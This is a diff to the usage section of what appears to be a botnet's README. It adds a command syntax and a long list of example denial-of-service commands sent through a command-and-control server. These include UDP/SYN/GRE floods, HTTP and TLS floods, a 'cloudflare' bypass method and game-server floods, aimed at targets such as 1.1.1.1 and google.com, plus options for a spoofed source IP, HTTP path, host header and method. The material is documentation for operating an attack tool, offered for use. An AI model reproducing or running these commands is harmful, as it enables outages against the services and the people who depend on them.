@@ -171,17 +171,41 @@ telnet <cnc-ip> 6621
 
 ### Usage
 ```
-<method> <target> <port> <duration> [options]
+<method> <target> <port> <duration> <len> [options]
 ```
+
+The target can be an **IP address** or a **domain name** (DNS resolution is performed automatically by the CNC).
 
 **Examples:**
 ```
-udp 1.1.1.1 80 60 len=1400
-syn 1.1.1.1 443 60 dport=443 ttl=64
-raknet 1.2.3.4 19132 120 len=24
-tls 1.1.1.1 443 60
-cloudflare 1.1.1.1 443 60 path=/login
-fivem 1.2.3.4 30120 120
+# Layer 4
+udp 1.1.1.1 80 60 1400
+syn example.com 443 60 512
+ack 192.168.1.1 80 60 1024
+stomp 10.0.0.1 443 60 512
+udpplain google.com 80 60 512
+udphex 1.1.1.1 53 60 1024
+tcpbypass example.com 443 60 512
+socket 1.1.1.1 80 60 1024
+greip 10.0.0.1 0 60 512
+greeth 10.0.0.1 0 60 512
+pps 1.1.1.1 0 60 1024
+dns 1.1.1.1 53 60 512
+esp 10.0.0.1 0 60 512
+
+# Layer 7
+http example.com 80 60 1024 path=/
+http example.com 80 60 1024 path=/login useragent="Mozilla/5.0"
+tls example.com 443 60 512
+tlsplus example.com 443 60 512
+cloudflare example.com 443 60 512 path=/
+nerv_l7 example.com 80 60 1024 path=/index.html
+
+# Games
+vse example.com 27015 60 512
+raknet 1.2.3.4 19132 60 24
+fivem example.com 30120 60 512
+discord 1.2.3.4 19309 60 512
 ```
 
 ### Common Options
@@ -194,8 +218,10 @@ fivem 1.2.3.4 30120 120
 | `df` | Don't Fragment flag | `df=1` |
 | `source` | Spoofed source IP | `source=1.1.1.1` |
 | `path` | HTTP path | `path=/index.php` |
+| `domain` | Custom domain for HTTP Host header | `domain=example.com` |
 | `useragent` | Custom User-Agent | `useragent="Mozilla/5.0"` |
 | `cookies` | HTTP cookies | `cookies="session=abc"` |
+| `method` | HTTP method (GET/POST) | `method=POST` |
 
 ---
 
